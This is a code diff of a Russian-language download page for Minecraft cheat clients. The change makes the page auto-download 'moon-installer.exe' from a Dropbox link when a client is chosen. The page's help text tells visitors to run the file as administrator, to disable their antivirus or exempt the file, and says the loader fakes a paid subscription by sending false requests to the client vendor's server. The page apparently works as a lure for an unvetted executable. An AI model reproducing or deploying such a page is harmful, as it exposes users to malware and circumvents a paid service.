@@ -36,7 +36,6 @@
     overflow-x: hidden;
   }
 
-  /* Subtle background grid */
   body::before {
     content: '';
     position: fixed;
@@ -49,7 +48,6 @@
     z-index: 0;
   }
 
-  /* Ambient glow top */
   body::after {
     content: '';
     position: fixed;
@@ -63,7 +61,6 @@
     z-index: 0;
   }
 
-  /* ── TOPBAR ── */
   .topbar {
     position: fixed;
     top: 0; left: 0; right: 0;
@@ -152,7 +149,6 @@
     border-radius: 1px;
   }
 
-  /* ── PAGES ── */
   .page {
     position: absolute;
     top: 64px; left: 0; right: 0;
@@ -176,7 +172,6 @@
     margin: 0 auto;
   }
 
-  /* ── PAGE HEADER ── */
   .page-header { margin-bottom: 48px; }
 
   .page-title {
@@ -201,7 +196,6 @@
     max-width: 400px;
   }
 
-  /* ── CARDS GRID ── */
   .cards-grid {
     display: grid;
     grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
@@ -337,7 +331,6 @@
 
   .btn-download:active { transform: translateY(0); }
 
-  /* ── MODAL OVERLAY ── */
   .modal-overlay {
     position: fixed;
     inset: 0;
@@ -486,7 +479,6 @@
     color: var(--blue-2);
   }
 
-  /* progress ring on close btn */
   .close-progress {
     position: absolute;
     inset: 0;
@@ -505,7 +497,6 @@
     transition: width 0.1s linear;
   }
 
-  /* ── HELP PAGE ── */
   .help-grid {
     display: grid;
     grid-template-columns: repeat(3, 1fr);
@@ -559,7 +550,6 @@
     line-height: 1.65;
   }
 
-  /* ── SCROLLBAR ── */
   ::-webkit-scrollbar { width: 5px; }
   ::-webkit-scrollbar-track { background: transparent; }
   ::-webkit-scrollbar-thumb { background: rgba(59,130,246,0.15); border-radius: 3px; }
@@ -568,7 +558,6 @@
 </head>
 <body>
 
-<!-- TOPBAR -->
 <header class="topbar">
   <a class="logo" onclick="showPage('cheats')">
     <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
@@ -781,7 +770,7 @@ FunTime, ReallyWorld
         </div>
         <div>
           <h3>Как установить Loader?</h3>
-          <p>Скачайте moon-loader.exe с нашего сайта и запустите от имени администратора. Выберите нужный клиент из списка — лаунчер установит всё автоматически.</p>
+          <p>Скачайте moon-installer.exe с нашего сайта и запустите от имени администратора. Выберите нужный клиент из списка — лаунчер установит всё автоматически.</p>
         </div>
       </div>
 
@@ -820,7 +809,7 @@ FunTime, ReallyWorld
         </div>
         <div>
           <h3>Почему нет прямого файла?</h3>
-          <p>Без лаунчера клиент обнаружит отсутствие подписки. лаунчер делает патч, имитирующий подписку отпровляя ненастоящие запросы на сервер клиента — это даёт доступ к актуальной версии клиента.</p>
+          <p>Без лаунчера клиент обнаружит отсутствие подписки. Лаунчер делает патч, имитирующий подписку отправляя ненастоящие запросы на сервер клиента — это даёт доступ к актуальной версии клиента.</p>
         </div>
       </div>
 
@@ -848,7 +837,7 @@ FunTime, ReallyWorld
         </div>
         <div>
           <h3>Требования</h3>
-          <p>Windows 10/11, Minecraft Java Edition 1.16.5. Всегда запускайте лаунчер от имени администратора для корректной работы патча. Перед запуском отключите антивирус или добавьте moon-loader.exe в исключения.</p>
+          <p>Windows 10/11, Minecraft Java Edition 1.16.5. Всегда запускайте лаунчер от имени администратора для корректной работы патча. Перед запуском отключите антивирус или добавьте moon-installer.exe в исключения.</p>
         </div>
       </div>
     </div>
@@ -870,7 +859,7 @@ FunTime, ReallyWorld
       Почему скачивается Loader, а не файл клиента? Если бы вы могли скачать клиент и запустить его напрямую через версию в вашем Майнкрафте — клиент бы обнаружил, что вы играете без подписки. В то время как наш Loader делает патч с имитацией того, что у вас есть подписка, из-за чего вы можете играть с последней и актуальной версией клиента.
     </div>
     <div class="modal-actions">
-      <a href="https://https://www.virustotal.com/gui/file/fa565772e049244570bbce8b234ea882cffa3df68a889d7d730664b6d0072e27?nocache=1 target="_blank" class="btn-virustotal">
+      <a href="https://www.virustotal.com/gui/file/fa565772e049244570bbce8b234ea882cffa3df68a889d7d730664b6d0072e27?nocache=1" target="_blank" class="btn-virustotal">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
           <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
         </svg>
@@ -902,7 +891,6 @@ FunTime, ReallyWorld
     document.getElementById('page-' + name).classList.add('active');
     document.getElementById('nav-' + name).classList.add('active');
 
-    // Re-trigger card animations
     document.querySelectorAll('#page-' + name + ' .card, #page-' + name + ' .help-card').forEach((c, i) => {
       c.style.animation = 'none';
       c.offsetHeight;
@@ -915,10 +903,10 @@ FunTime, ReallyWorld
   let timerInterval = null;
 
   function openModal(clientName) {
-    // Trigger download
+    // Trigger download via Dropbox direct link
     const a = document.createElement('a');
-    a.href = 'moon-loader.exe';
-    a.download = 'moon-loader.exe';
+    a.href = 'https://www.dropbox.com/scl/fi/ry18rmp89yuv6xd6k8mk1/moon-installer.exe?rlkey=0mf1yrlkk7jasyrcjdopw8xm0&st=am104mpk&dl=1';
+    a.download = 'moon-installer.exe';
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
@@ -926,7 +914,6 @@ FunTime, ReallyWorld
     document.getElementById('modal-title').textContent = clientName;
     document.getElementById('modal-overlay').classList.add('open');
 
-    // Reset close button
     const btn = document.getElementById('btn-close');
     const timer = document.getElementById('close-timer');
     const bar = document.getElementById('close-progress-bar');
@@ -965,7 +952,6 @@ FunTime, ReallyWorld
 
   function handleOverlayClick(e) {
     if (e.target === document.getElementById('modal-overlay')) {
-      // Only close if button is enabled
       if (!document.getElementById('btn-close').disabled) closeModal();
     }
   }
